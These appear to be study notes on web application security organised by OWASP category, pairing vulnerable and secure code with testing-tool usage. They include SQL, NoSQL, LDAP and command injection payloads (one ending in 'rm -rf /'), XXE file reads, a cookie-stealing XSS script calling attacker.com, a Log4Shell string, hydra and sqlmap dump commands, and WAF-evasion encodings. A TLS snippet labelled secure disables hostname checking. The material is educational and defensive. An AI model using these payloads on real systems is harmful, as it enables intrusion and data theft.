# Detailed Notes: Web Application Security

## Web Application Architecture - Deep Analysis

### Client-Server Architecture

#### Frontend Technologies
**HTML (HyperText Markup Language):**
```html
<!-- Security considerations in HTML -->
<!DOCTYPE html>
<html>
<head>
    <!-- Content Security Policy -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'">
    
    <!-- Prevent MIME type sniffing -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    
    <!-- XSS Protection -->
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
</head>
<body>
    <!-- Input validation example -->
    <form action="/submit" method="POST">
        <input type="text" name="username" pattern="[a-zA-Z0-9]+" required>
        <input type="email" name="email" required>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
```

**CSS (Cascading Style Sheets):**
- CSS injection attacks
- Data exfiltration via CSS
- Clickjacking prevention
- Style-based information disclosure

**JavaScript:**
```javascript
// Secure JavaScript practices
// Input validation
function validateInput(input) {
    const pattern = /^[a-zA-Z0-9\s]+$/;
    return pattern.test(input);
}

// XSS prevention
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Secure random number generation
function generateSecureRandom() {
    const array = new Uint32Array(1);
    crypto.getRandomValues(array);
    return array[0];
}
```

#### Backend Technologies

**Server-Side Languages:**
1. **PHP**
2. **Python (Django, Flask)**
3. **Java (Spring, Struts)**
4. **C# (.NET Framework/Core)**
5. **Node.js (Express.js)**
6. **Ruby (Ruby on Rails)**

**Web Servers:**
- **Apache HTTP Server**
- **Nginx**
- **Microsoft IIS**
- **Tomcat**
- **Node.js built-in server**

**Database Systems:**
- **MySQL/MariaDB**
- **PostgreSQL**
- **Microsoft SQL Server**
- **Oracle Database**
- **MongoDB (NoSQL)**
- **Redis (In-memory)**

### HTTP Protocol Security Analysis

#### HTTP Request Structure
```http
POST /api/login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
Content-Length: 45
Cookie: sessionid=abc123; csrftoken=xyz789
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

{"username": "user", "password": "pass123"}
```

#### Security-Critical HTTP Headers

**Request Headers:**
- **Host**: Virtual host identification (Host header injection)
- **User-Agent**: Client identification (can be spoofed)
- **Referer**: Previous page URL (can leak sensitive information)
- **Cookie**: Session and state management
- **Authorization**: Authentication credentials

**Response Headers:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

**Security Header Explanations:**
- **X-Frame-Options**: Prevents clickjacking attacks
- **X-Content-Type-Options**: Prevents MIME type sniffing
- **X-XSS-Protection**: Browser XSS filtering
- **Strict-Transport-Security**: Enforces HTTPS connections
- **Content-Security-Policy**: Controls resource loading

### Common Web Vulnerabilities - Detailed Analysis

#### A01: Injection Attacks

**1. SQL Injection - Comprehensive Analysis**

**Types of SQL Injection:**

**Classic SQL Injection:**
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Malicious input: admin'--
-- Resulting query
SELECT * FROM users WHERE username = 'admin'--' AND password = '$password'
```

**Union-Based SQL Injection:**
```sql
-- Original query
SELECT id, name, email FROM users WHERE id = '$id'

-- Malicious input: 1' UNION SELECT 1,username,password FROM admin_users--
-- Resulting query
SELECT id, name, email FROM users WHERE id = '1' UNION SELECT 1,username,password FROM admin_users--'
```

**Blind SQL Injection:**
```sql
-- Boolean-based blind injection
-- Test: 1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--

-- Time-based blind injection
-- Test: 1'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

**Error-Based SQL Injection:**
```sql
-- Oracle error-based injection
1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3))>2--

-- MySQL error-based injection
1' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--
```

**Prevention Techniques:**
```python
# Parameterized queries (Python/SQLite)
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))

# Stored procedures (safer when properly implemented)
cursor.callproc('authenticate_user', [username, password])

# ORM usage (Django example)
User.objects.filter(username=username, password=password)
```

**2. NoSQL Injection**
```javascript
// MongoDB injection example
// Vulnerable query
db.users.find({username: username, password: password})

// Malicious input
{
  "username": "admin",
  "password": {"$ne": null}
}
```

**3. Command Injection**
```python
# Vulnerable code
import os
filename = request.GET['filename']
os.system(f"cat {filename}")

# Malicious input: "file.txt; rm -rf /"
# Resulting command: cat file.txt; rm -rf /

# Secure alternative
import subprocess
result = subprocess.run(['cat', filename], capture_output=True, text=True)
```

**4. LDAP Injection**
```
# Vulnerable LDAP query
(&(uid=$username)(password=$password))

# Malicious input for username: admin)(&(password=*)
# Resulting query: (&(uid=admin)(&(password=*)(password=$password))
```

#### A02: Broken Authentication

**Common Authentication Flaws:**

**1. Weak Password Requirements**
```python
# Weak password policy
def validate_password(password):
    return len(password) >= 6  # Insufficient

# Strong password policy
import re
def validate_strong_password(password):
    if len(password) < 12:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'\d', password):
        return False
    if not re.search(r'[!@#$%^&*]', password):
        return False
    return True
```

**2. Session Management Flaws**
```python
# Insecure session handling
session_id = generate_session_id()  # Predictable generation
sessions[session_id] = user_data
response.set_cookie('sessionid', session_id)  # No security flags

# Secure session handling
import secrets
session_id = secrets.token_urlsafe(32)  # Cryptographically secure
sessions[session_id] = user_data
response.set_cookie('sessionid', session_id, 
                   httponly=True, secure=True, samesite='Strict')
```

**3. Multi-Factor Authentication Bypass**
```python
# Vulnerable MFA implementation
def login_with_mfa(username, password, mfa_code):
    user = authenticate(username, password)
    if user:
        if not mfa_code:  # Bypass if MFA code not provided
            return user
        if verify_mfa(user, mfa_code):
            return user
    return None

# Secure MFA implementation
def secure_login_with_mfa(username, password, mfa_code):
    user = authenticate(username, password)
    if user and user.mfa_enabled:
        if not mfa_code or not verify_mfa(user, mfa_code):
            return None
    return user
```

#### A03: Sensitive Data Exposure

**Data Classification and Protection:**

**1. Data at Rest Encryption**
```python
# Encryption example using cryptography library
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Encrypt sensitive data
sensitive_data = "Social Security Number: 123-45-6789"
encrypted_data = cipher_suite.encrypt(sensitive_data.encode())

# Decrypt when needed
decrypted_data = cipher_suite.decrypt(encrypted_data).decode()
```

**2. Data in Transit Protection**
```python
# TLS configuration example
import ssl
import socket

# Create secure SSL context
context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
context.check_hostname = False
context.verify_mode = ssl.CERT_REQUIRED

# Secure connection
with socket.create_connection(('example.com', 443)) as sock:
    with context.wrap_socket(sock, server_hostname='example.com') as ssock:
        ssock.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
        data = ssock.recv(1024)
```

**3. Key Management**
```python
# Environment-based key management
import os
from cryptography.fernet import Fernet

# Key should be stored in environment variable or key management service
encryption_key = os.environ.get('ENCRYPTION_KEY')
if not encryption_key:
    raise ValueError("Encryption key not found in environment")

cipher_suite = Fernet(encryption_key.encode())
```

#### A04: XML External Entities (XXE)

**XXE Attack Examples:**
```xml
<!-- External entity injection -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <user>&xxe;</user>
</root>

<!-- Remote XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
]>
<root>
    <data>&xxe;</data>
</root>
```

**Prevention:**
```python
# Secure XML parsing (Python)
import xml.etree.ElementTree as ET

# Disable external entity processing
def safe_xml_parse(xml_data):
    parser = ET.XMLParser()
    parser.parser.DefaultHandler = lambda data: None
    parser.parser.ExternalEntityRefHandler = lambda *args: False
    
    return ET.fromstring(xml_data, parser)
```

#### A05: Broken Access Control

**Access Control Patterns:**

**1. Vertical Privilege Escalation**
```python
# Vulnerable code
@app.route('/admin/users')
def admin_users():
    # Missing authorization check
    return render_template('admin_users.html', users=get_all_users())

# Secure code
@app.route('/admin/users')
@require_role('admin')
def admin_users():
    return render_template('admin_users.html', users=get_all_users())
```

**2. Horizontal Privilege Escalation**
```python
# Vulnerable - IDOR (Insecure Direct Object Reference)
@app.route('/user/<int:user_id>/profile')
def user_profile(user_id):
    user = User.query.get(user_id)  # Any user ID can be accessed
    return render_template('profile.html', user=user)

# Secure - Check ownership
@app.route('/user/<int:user_id>/profile')
@login_required
def user_profile(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)
    user = User.query.get(user_id)
    return render_template('profile.html', user=user)
```

**3. Role-Based Access Control (RBAC)**
```python
# RBAC implementation example
class Role:
    def __init__(self, name, permissions):
        self.name = name
        self.permissions = permissions

class User:
    def __init__(self, username, roles):
        self.username = username
        self.roles = roles
    
    def has_permission(self, permission):
        for role in self.roles:
            if permission in role.permissions:
                return True
        return False

# Permission decorator
def require_permission(permission):
    def decorator(f):
        def decorated_function(*args, **kwargs):
            if not current_user.has_permission(permission):
                abort(403)
            return f(*args, **kwargs)
        return decorated_function
    return decorator
```

#### A06: Security Misconfiguration

**Common Misconfigurations:**

**1. Default Credentials**
```bash
# Common default credentials to check
admin:admin
admin:password
root:root
administrator:password
user:user
```

**2. Unnecessary Services and Features**
```apache
# Apache misconfiguration
# Exposing server information
ServerTokens Full
ServerSignature On

# Secure configuration
ServerTokens Prod
ServerSignature Off

# Disable unnecessary modules
LoadModule status_module modules/mod_status.so  # Remove if not needed
```

**3. Directory Listing**
```apache
# Vulnerable configuration
<Directory "/var/www/html">
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>

# Secure configuration
<Directory "/var/www/html">
    Options -Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
```

#### A07: Cross-Site Scripting (XSS)

**XSS Attack Types:**

**1. Reflected XSS**
```html
<!-- Vulnerable page -->
<p>Search results for: <?php echo $_GET['query']; ?></p>

<!-- Malicious URL -->
http://example.com/search.php?query=<script>alert('XSS')</script>

<!-- Resulting page -->
<p>Search results for: <script>alert('XSS')</script></p>
```

**2. Stored XSS**
```html
<!-- Vulnerable comment system -->
<div class="comment">
    <p><?php echo $comment['content']; ?></p>
</div>

<!-- Malicious comment stored in database -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

**3. DOM-Based XSS**
```javascript
// Vulnerable JavaScript
function displayMessage() {
    var message = location.hash.substring(1);
    document.getElementById('output').innerHTML = message;
}

// Malicious URL
http://example.com/page.html#<script>alert('XSS')</script>
```

**XSS Prevention:**
```python
# Output encoding
import html
def safe_output(user_input):
    return html.escape(user_input)

# Content Security Policy
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"

# Input validation
import re
def validate_input(input_text):
    # Allow only alphanumeric characters and basic punctuation
    pattern = r'^[a-zA-Z0-9\s\.,!?-]+$'
    return re.match(pattern, input_text) is not None
```

### Web Application Testing Methodology

#### Information Gathering Phase

**1. Application Fingerprinting**
```bash
# Technology detection
whatweb http://example.com
wappalyzer http://example.com

# HTTP methods enumeration
nmap --script http-methods example.com

# Directory discovery
gobuster dir -u http://example.com -w /usr/share/wordlists/common.txt
dirb http://example.com
```

**2. Application Mapping**
```bash
# Spider the application
burp_spider http://example.com

# Manual crawling
curl -s http://example.com | grep -oE 'href="[^"]*"' | cut -d'"' -f2

# Robots.txt analysis
curl http://example.com/robots.txt
```

#### Vulnerability Assessment Phase

**1. Input Validation Testing**
```python
# Fuzzing inputs
payloads = [
    "' OR '1'='1",
    "<script>alert('XSS')</script>",
    "'; DROP TABLE users--",
    "../../../etc/passwd",
    "${jndi:ldap://attacker.com/exploit}"
]

for payload in payloads:
    test_input(payload)
```

**2. Authentication Testing**
```bash
# Brute force login
hydra -l admin -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Session analysis
burp_session_analyzer

# Password reset testing
curl -X POST http://example.com/password-reset -d "email=victim@example.com"
```

**3. Session Management Testing**
```python
# Session token analysis
def analyze_session_token(token):
    entropy = calculate_entropy(token)
    predictability = check_predictability(token)
    length = len(token)
    
    return {
        'entropy': entropy,
        'predictable': predictability,
        'length': length
    }
```

### Web Security Tools - Detailed Analysis

#### Burp Suite Professional

**Key Features:**
1. **Proxy**: Intercept and modify HTTP/HTTPS traffic
2. **Spider**: Automated application crawling
3. **Scanner**: Automated vulnerability detection
4. **Intruder**: Advanced payload delivery
5. **Repeater**: Manual request manipulation
6. **Sequencer**: Session token analysis
7. **Decoder**: Data encoding/decoding utilities
8. **Comparer**: Response comparison tool

**Burp Extensions:**
- **Autorize**: Authorization testing
- **CO2**: SQLite interface for Burp data
- **J2EEScan**: Java application testing
- **Reflected Parameters**: Parameter reflection detection

#### OWASP ZAP (Zed Attack Proxy)

**Features:**
1. **Automated Scanner**: Passive and active scanning
2. **Fuzzer**: Input fuzzing capabilities
3. **WebSocket Support**: Modern web app testing
4. **API Testing**: REST API security testing
5. **Scripting**: Custom script development

**ZAP Scripts:**
```javascript
// Custom ZAP script example
function scan(ps, msg, src) {
    var url = msg.getRequestHeader().getURI().toString();
    var body = msg.getRequestBody().toString();
    
    // Custom vulnerability check
    if (body.includes("password") && !url.includes("https")) {
        ps.raiseAlert(1, "Password sent over HTTP", url, "", "", "", "", "", "");
    }
}
```

#### SQLmap

**Advanced SQLmap Usage:**
```bash
# Basic injection test
sqlmap -u "http://example.com/page.php?id=1"

# POST data injection
sqlmap -u "http://example.com/login.php" --data "username=admin&password=pass"

# Cookie injection
sqlmap -u "http://example.com/profile.php" --cookie "sessionid=abc123"

# Database enumeration
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Table enumeration
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# Data extraction
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump
```

### Web Application Firewalls (WAF)

#### WAF Evasion Techniques

**1. Encoding Bypass**
```
# URL encoding
' OR '1'='1  →  %27%20OR%20%271%27%3D%271

# Double URL encoding
' OR '1'='1  →  %2527%2520OR%2520%25271%2527%253D%25271

# Unicode encoding
' OR '1'='1  →  \u0027\u0020OR\u0020\u0027\u0031\u0027\u003d\u0027\u0031
```

**2. Case Variation**
```sql
-- Original payload
' UNION SELECT * FROM users--

-- Case variation
' uNiOn SeLeCt * fRoM users--
```

**3. Comment Insertion**
```sql
-- Original payload
' OR '1'='1

-- Comment insertion
'/**/OR/**/'1'='1
' OR /*comment*/ '1'='1
```

#### WAF Detection and Fingerprinting
```python
# WAF detection script
import requests

def detect_waf(url):
    waf_signatures = {
        'cloudflare': ['cloudflare', 'cf-ray'],
        'aws_waf': ['awswaf'],
        'f5_bigip': ['f5-bigip', 'bigipserver'],
        'barracuda': ['barra'],
        'mod_security': ['mod_security']
    }
    
    response = requests.get(url)
    headers = str(response.headers).lower()
    
    for waf, signatures in waf_signatures.items():
        for signature in signatures:
            if signature in headers:
                return waf
    
    return "Unknown or no WAF detected"
```
